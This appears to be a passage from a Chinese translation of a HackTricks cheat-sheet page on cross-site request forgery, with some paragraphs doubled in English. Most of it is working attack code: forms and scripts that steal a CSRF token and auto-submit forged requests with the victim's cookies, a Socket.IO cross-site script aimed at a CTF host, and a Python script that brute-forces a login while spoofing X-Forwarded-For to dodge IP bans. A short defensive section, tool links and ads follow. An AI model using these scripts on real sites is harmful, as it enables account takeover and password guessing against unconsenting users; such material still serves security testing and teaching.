First, we need to create an HTML form with the necessary fields for the POST request. We will include a hidden input field to store the stolen CSRF token.

首先，我们需要创建一个HTML表单，其中包含用于POST请求的必要字段。我们将包含一个隐藏的输入字段来存储窃取的CSRF令牌。

```html
<form id="csrfForm" action="https://target-website.com/post-endpoint" method="POST">
  <input type="hidden" name="csrf_token" id="csrfToken" value="">
  <!-- Other form fields -->
  <input type="submit" value="Submit">
</form>
```

Next, we will use Ajax to make a GET request to the target website and extract the CSRF token from the response.

接下来，我们将使用Ajax向目标网站发出GET请求，并从响应中提取CSRF令牌。

```javascript
$.ajax({
  url: "https://target-website.com/csrf-endpoint",
  type: "GET",
  success: function(response) {
    var csrfToken = $(response).find("#csrfToken").val();
    $("#csrfToken").val(csrfToken);
  }
});
```

In the above code, we make a GET request to the `/csrf-endpoint` of the target website and extract the value of the `#csrfToken` input field from the response. We then set the value of the hidden input field in our form to the stolen CSRF token.

在上面的代码中，我们向目标网站的`/csrf-endpoint`发出GET请求，并从响应中提取`#csrfToken`输入字段的值。然后，我们将我们表单中隐藏输入字段的值设置为窃取的CSRF令牌。

Finally, when the user submits the form, the POST request will be sent to the target website with the stolen CSRF token.

最后，当用户提交表单时，将使用窃取的CSRF令牌将POST请求发送到目标网站。

Note: This technique assumes that the target website does not have any additional security measures in place to prevent CSRF attacks, such as SameSite cookies or CSRF tokens tied to specific user sessions.

注意：此技术假设目标网站没有采取任何额外的安全措施来防止CSRF攻击，例如SameSite cookie或与特定用户会话绑定的CSRF令牌。
```markup
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### 使用 Socket.IO 进行 CSRF 攻击

Socket.IO 是一个用于实时应用程序的 JavaScript 库，它可以在客户端和服务器之间建立持久的双向通信通道。由于 Socket.IO 的特性，它也可能存在 CSRF（跨站请求伪造）漏洞。

#### CSRF 攻击原理

CSRF 攻击利用了用户在访问受信任网站时的身份验证凭据。攻击者通过诱使受害者访问恶意网站，从而在受害者的浏览器中执行恶意操作。当受害者同时访问受信任网站时，浏览器会自动发送包含身份验证凭据的请求，从而导致攻击成功。

#### Socket.IO 中的 CSRF 攻击

在 Socket.IO 中，由于其使用了自定义的协议和长连接，传统的 CSRF 防御措施可能无法有效防止攻击。攻击者可以通过构造恶意请求，利用受害者的身份验证凭据发送请求到 Socket.IO 服务器，从而执行恶意操作。

#### 防御 CSRF 攻击

为了防御 Socket.IO 中的 CSRF 攻击，可以采取以下措施：

1. 使用 CSRF 令牌：在每个 Socket.IO 请求中包含一个 CSRF 令牌，并在服务器端验证该令牌的有效性。这样可以确保只有合法的请求才能被处理。

2. 启用 SameSite Cookie 属性：将 Cookie 的 SameSite 属性设置为 Strict 或 Lax，以限制跨站点请求。这样可以防止第三方网站在用户浏览器中执行 CSRF 攻击。

3. 使用双重身份验证：在 Socket.IO 请求中要求用户进行双重身份验证，例如输入验证码或使用二次确认。

通过采取这些防御措施，可以有效地防止 Socket.IO 中的 CSRF 攻击，保护用户的身份验证凭据和敏感信息的安全。
```markup
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF登录暴力破解

该代码可以使用CSRF令牌对登录表单进行暴力破解（还使用了X-Forwarded-For头部来尝试绕过可能的IP黑名单）：
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## 工具 <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## 参考资料

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

​

<figure><img src="../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

**HackenProof 是所有加密货币赏金的家园。**

**即时获得奖励**\
HackenProof 的赏金只有在客户存入奖励预算后才会启动。在漏洞验证后，您将获得奖励。

**在 web3 渗透测试中积累经验**\
区块链协议和智能合约是新的互联网！在它崛起的日子里掌握 web3 安全。

**成为 web3 黑客传奇**\
每次验证的漏洞都会获得声望积分，并占领每周排行榜的榜首。

[**在 HackenProof 上注册**](https://hackenproof.com/register) 开始从您的黑客攻击中获利！

{% embed url="https://hackenproof.com/register" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks 云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* 您在**网络安全公司**工作吗？您想在 HackTricks 中看到您的公司广告吗？或者您想获得最新版本的 PEASS 或下载 HackTricks 的 PDF 吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家 [**NFTs**](https://opensea.io/collection/the-peass-family) 集合 [**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获得[**官方 PEASS & HackTricks 商品**](https://peass.creator-spring.com)
* **加入** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或在 **Twitter** 上 **关注**我 [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向** [**hacktricks 仓库**](https://github.com/carlospolop/hacktricks) **和** [**hacktricks-cloud 仓库**](https://github.com/carlospolop/hacktricks-cloud) **提交 PR 来分享您的黑客技巧。**

</details>
